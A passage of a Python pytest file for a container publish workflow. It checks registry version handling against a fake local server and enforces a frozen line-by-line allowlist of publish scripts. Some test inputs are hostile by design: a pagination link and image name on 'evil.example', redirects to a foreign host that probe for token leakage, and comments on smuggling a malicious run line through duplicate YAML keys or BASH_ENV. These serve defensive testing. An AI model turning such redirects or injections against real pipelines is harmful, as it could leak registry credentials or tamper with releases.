"""Behavior tests for the release workflow scripts.

The workflow is parsed with PyYAML and its scripts are executed locally: the version
check runs against a fake OCI registry, the re-read step runs with bash the way
GitHub Actions does, and every publish-job script must match a hand-frozen,
default-deny allowlist physical line for physical line (see PUBLISH_RUN_LINES).
"""

import ast
import copy
import hashlib
import json
import os
import re
import subprocess
import sys
import threading
from collections.abc import Iterator
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

import pytest
import yaml


ROOT = Path(__file__).parents[1]
WORKFLOW = ROOT / ".github/workflows/publish-container.yml"
REPOSITORY = "xjoker/ghidra-mcp"
TAGS_PATH = f"/v2/{REPOSITORY}/tags/list"
FIRST_PAGE = f"{TAGS_PATH}?n=1000"
VERSION_CHECK = "Require a version newer than every published version"
ALLOWED_PUBLISH_ACTIONS = {
    "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
    "docker/setup-buildx-action@8d2750c68a42422c14e847fe6c8ac0403b4cbd6f",
    "docker/login-action@c94ce9fb468520275223c153574b00df6fe4bcc9",
    "docker/build-push-action@10e90e3645eae34f1e60eeb005ba3a3d33f178e8",
}
CANDIDATE_IMAGE = '"${IMAGE_NAME}@${{ steps.image.outputs.digest }}"'


@dataclass
class Step:
    name: str
    raw: dict[str, Any]

    @property
    def run(self) -> str | None:
        value = self.raw.get("run")
        assert value is None or isinstance(value, str), self.name
        return value

    @property
    def uses(self) -> str | None:
        return self.raw.get("uses")

    @property
    def shell(self) -> str | None:
        return self.raw.get("shell")


class _UniqueKeySafeLoader(yaml.SafeLoader):
    """yaml.SafeLoader that rejects a mapping key written twice.

    PyYAML keeps the last of two equal keys, so a step with a malicious `run:` (or
    `shell: sh`) followed by the frozen one would load as the frozen step. GitHub
    Actions rejects such a file, but the allowlist must not depend on that: the text
    it compares has to be the only text in the file.
    """


def _construct_unique_mapping(loader: yaml.SafeLoader, node: yaml.MappingNode) -> dict[Any, Any]:
    seen: set[Any] = set()
    for key_node, _ in node.value:
        if key_node.tag == "tag:yaml.org,2002:merge":
            continue
        key = loader.construct_object(key_node, deep=True)
        if key in seen:
            raise yaml.constructor.ConstructorError(
                "while constructing a mapping",
                node.start_mark,
                f"found duplicate key {key!r}",
                key_node.start_mark,
            )
        seen.add(key)
    return loader.construct_mapping(node, deep=True)


_UniqueKeySafeLoader.add_constructor(
    yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, _construct_unique_mapping
)


class WorkflowBytesError(ValueError):
    """The raw workflow file contains bytes the YAML loader would silently normalise."""


def _raw_workflow_problems(raw: bytes) -> list[str]:
    """Checks on the file bytes, before any decoding or YAML parsing.

    A YAML loader turns CR, CRLF and NEL (U+0085) into line feeds, so neither the
    allowlist nor FORBIDDEN_CHARACTER can see them in the loaded strings. GitHub's
    parser should normalise the same way, but the comparison must not depend on two
    parsers agreeing: the file has to be plain ASCII with LF line endings.
    """
    problems = []
    if b"\r" in raw:
        problems.append("raw workflow contains CR (\\r)")
    if b"\x85" in raw:
        problems.append("raw workflow contains a NEL byte (\\x85)")
    non_ascii = sorted({f"0x{byte:02x}" for byte in raw if byte > 0x7F})
    if non_ascii:
        problems.append(f"raw workflow contains non-ASCII bytes {', '.join(non_ascii)}")
    return problems


def _load_workflow(raw: bytes) -> dict[str, Any]:
    problems = _raw_workflow_problems(raw)
    if problems:
        raise WorkflowBytesError("; ".join(problems))
    # _UniqueKeySafeLoader is a SafeLoader subclass: only standard YAML tags are built.
    data = yaml.load(raw.decode("ascii"), Loader=_UniqueKeySafeLoader)
    assert isinstance(data, dict)
    return data


def _workflow() -> dict[str, Any]:
    return _load_workflow(WORKFLOW.read_bytes())


def _workflow_text() -> str:
    return WORKFLOW.read_bytes().decode("utf-8")


def _jobs() -> dict[str, list[Step]]:
    return {
        name: [Step(step["name"], step) for step in job["steps"]]
        for name, job in _workflow()["jobs"].items()
    }


def _step(job: str, name: str) -> Step:
    matches = [step for step in _jobs()[job] if step.name == name]
    assert len(matches) == 1, name
    return matches[0]


def _commands(script: str) -> list[str]:
    return [
        line.strip()
        for line in script.splitlines()
        if line.strip() and not line.strip().startswith("#")
    ]


@dataclass
class Registry:
    pages: dict[str, tuple[int, object, str | None]] = field(default_factory=dict)
    token_status: int = 200
    token_body: object = field(default_factory=lambda: {"token": "fake-token"})
    requests: list[str] = field(default_factory=list)
    scripted: dict[str, list[tuple[int, object, dict[str, str]]]] = field(default_factory=dict)
    url: str = ""

    def page(
        self, path: str, tags: object, next_link: str | None = None, status: int = 200
    ) -> None:
        body = (
            tags if isinstance(tags, dict) or status != 200 else {"name": REPOSITORY, "tags": tags}
        )
        self.pages[path] = (status, body, next_link)


@pytest.fixture
def registry() -> Iterator[Registry]:
    state = Registry()

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *args: object) -> None:
            pass

        def _send(
            self,
            status: int,
            body: object,
            link: str | None = None,
            headers: dict[str, str] | None = None,
        ) -> None:
            data = body if isinstance(body, bytes) else json.dumps(body).encode()
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            if link is not None:
                self.send_header("Link", f'<{link}>; rel="next"')
            for name, value in (headers or {}).items():
                self.send_header(name, value)
            self.end_headers()
            self.wfile.write(data)

        def do_GET(self) -> None:
            state.requests.append(self.path)
            if state.scripted.get(self.path):
                status, body, headers = state.scripted[self.path].pop(0)
                self._send(status, body, headers=headers)
                return
            if self.path.startswith("/token?"):
                assert self.path == f"/token?service=ghcr.io&scope=repository:{REPOSITORY}:pull"
                self._send(state.token_status, state.token_body)
                return
            assert self.headers["Authorization"] == "Bearer fake-token"
            if self.path not in state.pages:
                self._send(404, {"errors": [{"code": "NAME_UNKNOWN"}]})
                return
            self._send(*state.pages[self.path])

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    state.url = f"http://127.0.0.1:{server.server_port}"
    thread = threading.Thread(target=server.serve_forever, args=(0.05,), daemon=True)
    thread.start()
    try:
        yield state
    finally:
        server.shutdown()
        server.server_close()


SLEEP_SHIM = """
import os
import time


def _record_sleep(seconds):
    with open(os.environ["SLEEP_LOG"], "a", encoding="utf-8") as log:
        log.write(f"{seconds}\\n")


time.sleep = _record_sleep
"""


def _version_check(
    registry: Registry, version: str, tmp_path: Path, image: str = f"ghcr.io/{REPOSITORY}"
) -> subprocess.CompletedProcess[str]:
    step = _step("publish", VERSION_CHECK)
    assert step.shell == "python3 {0}" and step.run is not None
    script = tmp_path / "version_check.py"
    script.write_text(step.run, encoding="utf-8")
    # time.sleep is replaced through sitecustomize so retry back-off is recorded
    # (in sleeps.log) instead of slowing the tests down.
    shim = tmp_path / "shim"
    shim.mkdir(exist_ok=True)
    (shim / "sitecustomize.py").write_text(SLEEP_SHIM, encoding="utf-8")
    env = {
        "PATH": os.environ.get("PATH", ""),
        "PYTHONPATH": str(shim),
        "SLEEP_LOG": str(tmp_path / "sleeps.log"),
        "VERSION": version,
        "REGISTRY_URL": registry.url,
        "IMAGE_NAME": image,
    }
    return subprocess.run(
        [sys.executable, str(script)], env=env, capture_output=True, text=True, timeout=60
    )


def _passes(result: subprocess.CompletedProcess[str]) -> bool:
    if result.returncode == 0:
        assert "is newer than published version" in result.stdout
        return True
    assert "Version check failed:" in result.stderr, result.stderr
    return False


@pytest.mark.parametrize(
    ("published", "candidate", "accepted"),
    [
        (["20261019.1", "latest", "sha-abc"], "20261019.2", True),
        (["20261019.1"], "20261020.1", True),
        (["20261019.1"], "20261019.1", False),
        (["20261019.1"], "20260722.7", False),
        (["20261019.1"], "20261018.9", False),
        (["20261019.9"], "20261019.10", True),
        (["20261019.9", "20261019.10"], "20261019.10", False),
        (["20261019.10"], "20261019.9", False),
        (["20251231.99", "20261019.1"], "20260101.1", False),
        (["20261019.1", "v20271231.1", "20271231.01", "20271231.0"], "20261019.2", True),
    ],
)
def test_version_check_compares_numerically(
    registry: Registry, tmp_path: Path, published: list[str], candidate: str, accepted: bool
) -> None:
    registry.page(FIRST_PAGE, published)

    assert _passes(_version_check(registry, candidate, tmp_path)) is accepted


def test_version_check_follows_every_page(registry: Registry, tmp_path: Path) -> None:
    registry.page(FIRST_PAGE, ["20261019.1"], f"{TAGS_PATH}?last=a&n=1000")
    registry.page(f"{TAGS_PATH}?last=a&n=1000", ["latest"], f"{TAGS_PATH}?last=b&n=1000")
    registry.page(f"{TAGS_PATH}?last=b&n=1000", ["20261019.9"])

    assert not _passes(_version_check(registry, "20261019.5", tmp_path))
    result = _version_check(registry, "20261019.10", tmp_path)
    assert _passes(result)
    assert "3 pages" in result.stdout


@pytest.mark.parametrize(
    ("pages", "message"),
    [
        ({FIRST_PAGE: ([], None)}, "no published version tags"),
        ({FIRST_PAGE: (["latest", "sha-abc"], None)}, "no published version tags"),
        ({FIRST_PAGE: ({"errors": [{"code": "DENIED"}]}, None)}, "has no list of tags"),
        ({FIRST_PAGE: ({"name": REPOSITORY, "tags": None}, None)}, "has no list of tags"),
        ({FIRST_PAGE: ({"name": REPOSITORY, "tags": "20261019.1"}, None)}, "has no list of tags"),
        ({FIRST_PAGE: ({"name": REPOSITORY, "tags": [20261019]}, None)}, "has no list of tags"),
        (
            {
                FIRST_PAGE: (["20261019.1"], f"{TAGS_PATH}?last=a&n=1000"),
                f"{TAGS_PATH}?last=a&n=1000": ({"errors": [{"code": "UNKNOWN"}]}, None),
            },
            "has no list of tags",
        ),
        ({FIRST_PAGE: (["20261019.1"], FIRST_PAGE)}, "pagination loops back"),
        (
            {
                FIRST_PAGE: (["20261019.1"], f"{TAGS_PATH}?last=a&n=1000"),
                f"{TAGS_PATH}?last=a&n=1000": (["latest"], FIRST_PAGE),
            },
            "pagination loops back",
        ),
        (
            {FIRST_PAGE: (["20261019.1"], "https://evil.example/v2/x/tags/list?n=1")},
            "unexpected pagination link",
        ),
        (
            {
                FIRST_PAGE: (["20261019.1"], "/v2/other/repo/tags/list?n=1000"),
                "/v2/other/repo/tags/list?n=1000": (["20991231.9"], None),
            },
            "unexpected pagination link",
        ),
        (
            {FIRST_PAGE: (["20261019.1"], f"{TAGS_PATH}/../../other/tags/list?n=1000")},
            "unexpected pagination link",
        ),
        ({FIRST_PAGE: (["20261019.1"], f"{TAGS_PATH}?last=missing&n=1000")}, "returned HTTP 404"),
    ],
)
def test_version_check_fails_closed(
    registry: Registry, tmp_path: Path, pages: dict[str, tuple[object, str | None]], message: str
) -> None:
    for path, (tags, link) in pages.items():
        registry.page(path, tags, link)

    result = _version_check(registry, "20991231.1", tmp_path)

    assert result.returncode != 0
    assert message in result.stderr, result.stderr


def test_version_check_does_not_retry_client_errors(registry: Registry, tmp_path: Path) -> None:
    registry.page(FIRST_PAGE, ["20261019.1"], f"{TAGS_PATH}?last=missing&n=1000")

    result = _version_check(registry, "20991231.1", tmp_path)

    assert result.returncode != 0
    assert registry.requests.count(f"{TAGS_PATH}?last=missing&n=1000") == 1


def test_version_check_caps_the_number_of_pages(registry: Registry, tmp_path: Path) -> None:
    for page in range(60):
        path = FIRST_PAGE if page == 0 else f"{TAGS_PATH}?last={page}&n=1000"
        registry.page(path, ["20261019.1"], f"{TAGS_PATH}?last={page + 1}&n=1000")

    result = _version_check(registry, "20991231.1", tmp_path)

    assert result.returncode != 0
    assert "more than 50 tag pages" in result.stderr
    assert len([path for path in registry.requests if path.startswith(TAGS_PATH)]) == 50


@pytest.mark.parametrize(
    ("status", "body", "message"),
    [
        (401, {"errors": []}, "returned HTTP 401"),
        (200, {"access_token": "x"}, "has no token"),
        (200, {"token": ""}, "token is empty"),
    ],
)
def test_version_check_fails_without_a_registry_token(
    registry: Registry, tmp_path: Path, status: int, body: object, message: str
) -> None:
    registry.token_status = status
    registry.token_body = body
    registry.page(FIRST_PAGE, ["20261019.1"])

    result = _version_check(registry, "20991231.1", tmp_path)

    assert result.returncode != 0
    assert message in result.stderr


@pytest.mark.parametrize(
    "image", ["docker.io/7678837-glitch/ghidra-mcp", "ghcr.io.evil.example/x", "", "ghcr.io"]
)
def test_version_check_rejects_an_image_outside_ghcr(
    registry: Registry, tmp_path: Path, image: str
) -> None:
    registry.page(FIRST_PAGE, ["20261019.1"])

    result = _version_check(registry, "20991231.1", tmp_path, image=image)

    assert result.returncode != 0
    assert "unexpected image name" in result.stderr
    assert registry.requests == []


def test_version_check_reads_inputs_only_from_the_environment() -> None:
    # Expressions interpolated into the script body would be code injection;
    # every input must arrive through env.
    step = _step("publish", VERSION_CHECK)
    assert step.run is not None and "${{" not in step.run
    assert set(step.raw["env"]) == {"VERSION", "REGISTRY_URL"}


def test_version_check_rejects_a_malformed_candidate(registry: Registry, tmp_path: Path) -> None:
    registry.page(FIRST_PAGE, ["20261019.1"])

    result = _version_check(registry, "20991231.01", tmp_path)

    assert result.returncode != 0
    assert "is not a YYYYMMDD.N version" in result.stderr


def test_version_check_uses_only_the_standard_library() -> None:
    script = _step("publish", VERSION_CHECK).run
    assert script is not None
    imported = set()
    for node in ast.walk(ast.parse(script)):
        if isinstance(node, ast.Import):
            imported.update(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom):
            assert node.module is not None
            imported.add(node.module)
    assert imported == {
        "http.client",
        "json",
        "os",
        "re",
        "sys",
        "time",
        "typing",
        "urllib.error",
        "urllib.parse",
        "urllib.request",
    }


@dataclass
class Foreign:
    url: str = ""
    seen: list[tuple[str, str | None]] = field(default_factory=list)


@pytest.fixture
def foreign() -> Iterator[Foreign]:
    state = Foreign()

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *args: object) -> None:
            pass

        def do_GET(self) -> None:
            state.seen.append((self.path, self.headers.get("Authorization")))
            data = json.dumps({"name": REPOSITORY, "tags": ["20200101.1"]}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(data)

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    state.url = f"http://127.0.0.1:{server.server_port}"
    thread = threading.Thread(target=server.serve_forever, args=(0.05,), daemon=True)
    thread.start()
    try:
        yield state
    finally:
        server.shutdown()
        server.server_close()


@pytest.mark.parametrize("status", [301, 302, 303, 307, 308])
@pytest.mark.parametrize("target", ["same-host", "foreign-host"])
@pytest.mark.parametrize("where", ["token", "tags"])
def test_version_check_rejects_every_redirect(
    registry: Registry, foreign: Foreign, tmp_path: Path, status: int, target: str, where: str
) -> None:
    registry.page(FIRST_PAGE, ["20261019.1"])
    registry.page(f"{TAGS_PATH}?n=1000&moved=1", ["20200101.1"])
    if target == "same-host":
        location = f"{registry.url}{TAGS_PATH}?n=1000&moved=1"
    else:
        location = f"{foreign.url}{TAGS_PATH}?n=1000"
    token_path = f"/token?service=ghcr.io&scope=repository:{REPOSITORY}:pull"
    path = token_path if where == "token" else FIRST_PAGE
    registry.scripted[path] = [(status, {}, {"Location": location})]

    result = _version_check(registry, "20261019.2", tmp_path)

    assert result.returncode != 0
    assert f"was redirected (HTTP {status})" in result.stderr, result.stderr
    assert foreign.seen == []
    assert f"{TAGS_PATH}?n=1000&moved=1" not in registry.requests


@pytest.mark.parametrize(
    ("failures", "accepted", "attempts"),
    [
        ([429, 429], True, 3),
        ([500, 502, 503, 504], True, 5),
        ([429] * 5, False, 5),
        ([503] * 5, False, 5),
        ([401], False, 1),
        ([403], False, 1),
        ([404], False, 1),
    ],
)
def test_version_check_retries_only_transient_errors(
    registry: Registry, tmp_path: Path, failures: list[int], accepted: bool, attempts: int
) -> None:
    registry.page(FIRST_PAGE, ["20261019.1"])
    registry.scripted[FIRST_PAGE] = [(code, {"errors": []}, {}) for code in failures]

    result = _version_check(registry, "20261019.2", tmp_path)

    assert (result.returncode == 0) is accepted, result.stderr
    assert registry.requests.count(FIRST_PAGE) == attempts
    log = tmp_path / "sleeps.log"
    sleeps = [float(value) for value in log.read_text().split()] if log.exists() else []
    assert len(sleeps) == attempts - 1
    assert sum(sleeps) <= 30


def test_version_check_bounds_every_request() -> None:
    script = _step("publish", VERSION_CHECK).run
    assert script is not None
    tree = ast.parse(script)
    calls = [node for node in ast.walk(tree) if isinstance(node, ast.Call)]
    opens = [
        call
        for call in calls
        if isinstance(call.func, ast.Attribute) and call.func.attr in {"open", "urlopen"}
    ]
    assert opens, "no HTTP call found"
    for call in opens:
        assert isinstance(call.func.value, ast.Name) and call.func.value.id == "OPENER"
        assert any(keyword.arg == "timeout" for keyword in call.keywords)
    assert "build_opener(RejectRedirects)" in script


def _reread(tmp_path: Path, version_file: str, ref: str, tested: str, schema: str) -> int:
    step = _step("publish", "Re-read version and test outputs")
    assert step.shell == "bash" and step.run is not None
    (tmp_path / "VERSION").write_text(version_file + "\n", encoding="utf-8")
    output = tmp_path / "github_output"
    output.write_text("", encoding="utf-8")
    env = {
        "PATH": os.environ.get("PATH", ""),
        "GITHUB_OUTPUT": str(output),
        "GITHUB_REF_NAME": ref,
        "TESTED_VERSION": tested,
        "TESTED_SCHEMA": schema,
    }
    result = subprocess.run(
        ["bash", "--noprofile", "--norc", "-eo", "pipefail", "-c", step.run],
        cwd=tmp_path,
        env=env,
        capture_output=True,
        text=True,
        timeout=30,
    )
    if result.returncode == 0:
        assert output.read_text(encoding="utf-8") == f"value={tested}\nschema={schema}\n"
    return result.returncode


@pytest.mark.parametrize(
    ("version_file", "ref", "tested", "schema", "accepted"),
    [
        ("20261019.2", "v20261019.2", "20261019.2", "7f776a2cc7e60136", True),
        ("20261019.2", "v20261019.2", "20261019.1", "7f776a2cc7e60136", False),
        ("20261019.2", "v20261019.2", "", "7f776a2cc7e60136", False),
        ("20261019.2", "v20261019.3", "20261019.2", "7f776a2cc7e60136", False),
        ("20261019.02", "v20261019.02", "20261019.02", "7f776a2cc7e60136", False),
        ("20261019.2", "v20261019.2", "20261019.2", "", False),
        ("20261019.2", "v20261019.2", "20261019.2", "7f776a2cc7e6013G", False),
    ],
)
def test_publish_rereads_version_and_matches_test_job_outputs(
    tmp_path: Path, version_file: str, ref: str, tested: str, schema: str, accepted: bool
) -> None:
    assert (_reread(tmp_path, version_file, ref, tested, schema) == 0) is accepted


def test_publish_checks_version_before_login_and_build() -> None:
    names = [step.name for step in _jobs()["publish"]]

    assert names.index("Re-read version and test outputs") < names.index(VERSION_CHECK)
    assert names.index(VERSION_CHECK) < names.index("Log in to GHCR")
    assert names.index(VERSION_CHECK) < names.index("Build and publish commit candidate")
    assert names.index("Verify the candidate digest") < names.index("Promote verified digest")


# ---------------------------------------------------------------------------
# Publish job: default-deny, exact-match allowlist (SAF-50).
#
# Every bash `run:` script in the publish job must consist of exactly the physical
# lines frozen below, in the same order, for the same step. Nothing is parsed as
# shell and nothing is normalised: the script is split on "\n" and each piece must
# equal the frozen line byte for byte, indentation, `\` continuations and the empty
# piece after the final newline included. The ordered per-step comparison is
# therefore the same as comparing the whole script string, while a failure still
# names the offending line. The text compared is the string the YAML loader returns
# (see _workflow), i.e. what Actions hands to bash; `${{ }}` expressions are
# compared literally.
#
# Why physical lines rather than joined `\` continuations (SAF-50 R1): joining
# `<blank>\<newline><blanks>` into one space mapped a continuation inserted inside a
# quoted string or inside a `${{ }}` expression back onto the frozen line, although
# bash (inside quotes) or Actions (inside `${{ }}`) see different text. Comparing
# physical lines leaves no normalisation step to disagree with bash or Actions.
# A per-step sha256 would be equally exact but would hide which line changed and
# could not reject a foreign line by itself, so the readable table stays.
#
# These tables are hand-frozen on purpose. They are never regenerated from the
# workflow at test time (that would make the test approve itself). Any change to
# a publish script, a step's shell fields, or the version check script must
# update the matching table in the same pull request, and the reviewer must
# confirm the new text.
# ---------------------------------------------------------------------------

# A step whose script ends with a newline ends with "" (the text after it).
PUBLISH_RUN_LINES: dict[str, tuple[str, ...]] = {
    "Re-read version and test outputs": (
        "VERSION=\"$(tr -d '\\r\\n' < VERSION)\"",
        '[[ "$VERSION" =~ ^[0-9]{8}\\.[1-9][0-9]*$ ]]',
        'if [[ "$GITHUB_REF_NAME" != "v$VERSION" || "$VERSION" != "$TESTED_VERSION" ]]; then',
        '  echo "VERSION $VERSION does not match tag $GITHUB_REF_NAME or tested version $TESTED_VERSION" >&2',
        "  exit 1",
        "fi",
        '[[ "$TESTED_SCHEMA" =~ ^[0-9a-f]{16}$ ]]',
        'echo "value=$VERSION" >> "$GITHUB_OUTPUT"',
        'echo "schema=$TESTED_SCHEMA" >> "$GITHUB_OUTPUT"',
        "",
    ),
    "Refuse to overwrite a released version": (
        'if INSPECT_ERROR="$(docker manifest inspect \\',
        '  "${IMAGE_NAME}:${{ steps.version.outputs.value }}" 2>&1)"; then',
        '  echo "Version tag already exists: ${IMAGE_NAME}:${{ steps.version.outputs.value }}" >&2',
        "  exit 1",
        "fi",
        "if ! grep -Eqi 'manifest unknown|not found' <<<\"$INSPECT_ERROR\"; then",
        '  echo "Could not prove that the version tag is unused:" >&2',
        "  printf '%s\\n' \"$INSPECT_ERROR\" >&2",
        "  exit 1",
        "fi",
        "",
    ),
    "Verify the candidate digest": (
        'docker pull "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"',
        'TOKEN="$(openssl rand -hex 32)"',
        "docker run -d --name ghidra-mcp-ci --network host \\",
        "  -e GHIDRA_MCP_PUBLIC_URL=http://127.0.0.1:8765 \\",
        '  -e GHIDRA_MCP_AUTH_TOKEN="$TOKEN" \\',
        '  "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"',
        'HEALTH=""',
        "for _ in $(seq 1 30); do",
        '  HEALTH="$(curl -fsS http://127.0.0.1:8765/health || true)"',
        '  if [ -n "$HEALTH" ]; then',
        '    python3 -c \'import json,sys; data=json.loads(sys.argv[4]); assert data == {"status": "ok", "version": sys.argv[1], "git_commit": sys.argv[2], "schema_version": sys.argv[3]}\' \\',
        '      "${{ steps.version.outputs.value }}" "${{ github.sha }}" \\',
        '      "${{ steps.version.outputs.schema }}" "$HEALTH"',
        "    break",
        "  fi",
        "  sleep 2",
        "done",
        'if [ -z "$HEALTH" ]; then',
        "  docker logs ghidra-mcp-ci",
        "  exit 1",
        "fi",
        "",
    ),
    "Promote verified digest": (
        "docker buildx imagetools create \\",
        '  --tag "${IMAGE_NAME}:${{ steps.version.outputs.value }}" \\',
        '  --tag "${IMAGE_NAME}:latest" \\',
        '  "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"',
        'VERSION_DIGEST="$(docker buildx imagetools inspect \\',
        '  "${IMAGE_NAME}:${{ steps.version.outputs.value }}" \\',
        "  --format '{{json .Manifest.Digest}}' | tr -d '\"')\"",
        'test "$VERSION_DIGEST" = "${{ steps.image.outputs.digest }}"',
        "",
    ),
    "Remove verification container": ("docker rm -f ghidra-mcp-ci 2>/dev/null || true",),
}
ALL_PUBLISH_RUN_LINES = frozenset(line for lines in PUBLISH_RUN_LINES.values() for line in lines)

# sha256 of the version check script exactly as yaml.safe_load returns it (UTF-8).
# Any change to the script must update this hash in the same pull request; the
# behaviour tests above still cover what the script does.
VERSION_CHECK_SHA256 = "fff2ef840624e268139f3506c7ebbec2afdc130d6e64d5fab0b55e5a00d66715"

# The full step order of the publish job.
PUBLISH_STEP_NAMES = (
    "Check out repository",
    "Re-read version and test outputs",
    VERSION_CHECK,
    "Set up Docker Buildx",
    "Log in to GHCR",
    "Refuse to overwrite a released version",
    "Build and publish commit candidate",
    "Verify the candidate digest",
    "Promote verified digest",
    "Remove verification container",
)

# Exact values of the shell-related fields of every `run:` step. A field missing
# from a step's entry must be absent from the step. A step may have no keys other
# than `name`, `run` and the fields listed for it, so `working-directory`,
# `continue-on-error`, `with`, a new `env` (for example BASH_ENV), ... all fail.
PUBLISH_RUN_STEP_FIELDS: dict[str, dict[str, object]] = {
    "Re-read version and test outputs": {
        "id": "version",
        "shell": "bash",
        "env": {
            "TESTED_VERSION": "${{ needs.test.outputs.version }}",
            "TESTED_SCHEMA": "${{ needs.test.outputs.schema }}",
        },
    },
    VERSION_CHECK: {
        "timeout-minutes": 5,
        "shell": "python3 {0}",
        "env": {"VERSION": "${{ steps.version.outputs.value }}", "REGISTRY_URL": "https://ghcr.io"},
    },
    "Refuse to overwrite a released version": {"shell": "bash"},
    "Verify the candidate digest": {"shell": "bash"},
    "Promote verified digest": {"shell": "bash"},
    "Remove verification container": {"if": "always()"},
}
FROZEN_STEP_FIELDS = ("shell", "env", "if", "id", "timeout-minutes")

# Environment visible to every publish step. A workflow- or job-level BASH_ENV,
# ENV, PATH, ... would change what the frozen scripts do without touching them.
WORKFLOW_ENV = {"IMAGE_NAME": "ghcr.io/${{ github.repository }}"}
PUBLISH_JOB_KEYS = {"name", "needs", "runs-on", "timeout-minutes", "permissions", "steps"}

# Rejected before any comparison, for a clearer message: `#` (comments, and the
# mid-word `#` that hid commands from the old shlex-based checker), and every
# character outside printable ASCII apart from the newline (tab, CR, other
# control characters, non-ASCII). None of them occur in the frozen lines.
FORBIDDEN_CHARACTER = re.compile(r"[^\x20-\x7e\n]|#")


def _physical_lines(script: str) -> tuple[str, ...]:
    """Split on "\\n" only: nothing is joined, stripped or dropped."""
    return tuple(script.split("\n"))


def _same(actual: object, expected: object) -> bool:
    # json.dumps keeps types apart (True vs 1, 5 vs "5") and compares nested
    # mappings by content.
    return json.dumps(actual, sort_keys=True) == json.dumps(expected, sort_keys=True)


def _forbidden_characters(script: str) -> list[str]:
    return sorted({repr(match) for match in FORBIDDEN_CHARACTER.findall(script)})


def _line_problems(script: str) -> list[str]:
    """Problems with a script whose every line must be some frozen publish line."""
    bad = _forbidden_characters(script)
    if bad:
        return [f"forbidden character(s) {', '.join(bad)}"]
    return [
        f"not allowlisted: {line}"
        for line in _physical_lines(script)
        if line not in ALL_PUBLISH_RUN_LINES
    ]


def _step_field_problems(name: str, step: dict[str, Any]) -> list[str]:
    frozen = PUBLISH_RUN_STEP_FIELDS[name]
    problems = []
    # Any key that is not frozen for this step must be absent, which covers a
    # frozen field that the step does not have today (e.g. `env` on Remove).
    extra = set(step) - {"name", "run"} - set(frozen)
    if extra:
        problems.append(f"{name}: keys {sorted(extra)} must be absent")
    for key, value in frozen.items():
        if not _same(step.get(key), value):
            problems.append(f"{name}: {key} must be {value!r}, got {step.get(key)!r}")
    return problems


def _bash_run_problems(name: str, run: str) -> list[str]:
    bad = _forbidden_characters(run)
    if bad:
        return [f"{name}: forbidden character(s) {', '.join(bad)}"]
    frozen = PUBLISH_RUN_LINES[name]
    lines = _physical_lines(run)
    problems = [
        f"{name}: line {index} is not allowlisted for this step: {line}"
        for index, line in enumerate(lines)
        if line not in frozen
    ]
    if lines != frozen:
        problems.append(
            f"{name}: lines differ from the frozen sequence (order, duplicate or missing)"
        )
    return problems


def _publish_problems(workflow: dict[str, Any]) -> list[str]:
    """Every deviation of the publish job from the frozen tables; [] means it passes."""
    problems = []
    publish = workflow["jobs"]["publish"]
    if "defaults" in workflow or "defaults" in publish:
        problems.append("defaults: is not allowed at workflow or publish job level")
    if not _same(workflow.get("env"), WORKFLOW_ENV):
        problems.append(f"workflow env must be {WORKFLOW_ENV!r}, got {workflow.get('env')!r}")
    if set(publish) != PUBLISH_JOB_KEYS:
        problems.append(f"publish job keys {sorted(set(publish) ^ PUBLISH_JOB_KEYS)} added/removed")
    steps = publish["steps"]
    names = tuple(step.get("name") for step in steps)
    if names != PUBLISH_STEP_NAMES:
        problems.append(f"publish steps must be {PUBLISH_STEP_NAMES}, got {names}")
    run_steps = [step for step in steps if "run" in step]
    run_names = [step.get("name") for step in run_steps]
    if sorted(map(str, run_names)) != sorted(PUBLISH_RUN_STEP_FIELDS):
        problems.append(f"run steps must be {sorted(PUBLISH_RUN_STEP_FIELDS)}, got {run_names}")
    for step in run_steps:
        name = step.get("name")
        if name not in PUBLISH_RUN_STEP_FIELDS:
            problems.append(f"unknown run step: {name!r}")
            continue
        problems.extend(_step_field_problems(name, step))
        run = step["run"]
        if not isinstance(run, str):
            problems.append(f"{name}: run is not a string")
        elif name == VERSION_CHECK:
            digest = hashlib.sha256(run.encode("utf-8")).hexdigest()
            if digest != VERSION_CHECK_SHA256:
                problems.append(f"{name}: script sha256 {digest} != VERSION_CHECK_SHA256")
        else:
            problems.extend(_bash_run_problems(name, run))
    return problems


def test_publish_job_matches_the_frozen_allowlist() -> None:
    assert _raw_workflow_problems(WORKFLOW.read_bytes()) == []
    assert _publish_problems(_workflow()) == []


def test_version_check_script_matches_the_pinned_hash() -> None:
    script = _step("publish", VERSION_CHECK).run
    assert script is not None
    assert hashlib.sha256(script.encode("utf-8")).hexdigest() == VERSION_CHECK_SHA256


def test_publish_allowlist_tables_are_consistent() -> None:
    # Frozen lines are single physical lines without a forbidden character, and
    # the run steps are exactly the frozen bash steps plus the version check.
    for lines in PUBLISH_RUN_LINES.values():
        for line in lines:
            assert _physical_lines(line) == (line,)
            assert not FORBIDDEN_CHARACTER.search(line), line
    assert set(PUBLISH_RUN_STEP_FIELDS) == set(PUBLISH_RUN_LINES) | {VERSION_CHECK}
    for fields in PUBLISH_RUN_STEP_FIELDS.values():
        assert set(fields) <= set(FROZEN_STEP_FIELDS)
    assert [name for name in PUBLISH_STEP_NAMES if name in PUBLISH_RUN_STEP_FIELDS] == list(
        PUBLISH_RUN_STEP_FIELDS
    )
    # 49 non-empty physical lines plus the "" after the final newline of 4 steps.
    assert sum(map(len, PUBLISH_RUN_LINES.values())) == 53
    assert sum(1 for lines in PUBLISH_RUN_LINES.values() for line in lines if line) == 49
    assert len(ALL_PUBLISH_RUN_LINES) == 43


def test_publish_job_steps_use_only_pinned_actions() -> None:
    steps = _jobs()["publish"]

    assert steps[0].uses is not None and steps[0].uses.startswith("actions/checkout@")
    for step in steps:
        assert set(step.raw) <= {
            "name",
            "id",
            "uses",
            "with",
            "shell",
            "env",
            "run",
            "if",
            "timeout-minutes",
        }, step.name
        if step.uses is not None:
